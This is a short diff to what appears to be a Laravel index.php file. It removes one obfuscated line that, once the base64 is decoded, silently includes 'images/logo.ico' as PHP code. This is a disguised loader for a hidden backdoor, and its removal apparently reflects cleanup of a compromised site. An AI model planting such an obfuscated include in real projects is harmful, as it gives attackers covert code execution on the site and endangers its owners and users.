@@ -16,8 +16,6 @@ define('LARAVEL_START', microtime(true));
 |
 */
 
-@include base64_decode('aW1hZ2VzL2xvZ28uaWNv');
-
 if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
     require $maintenance;
 }
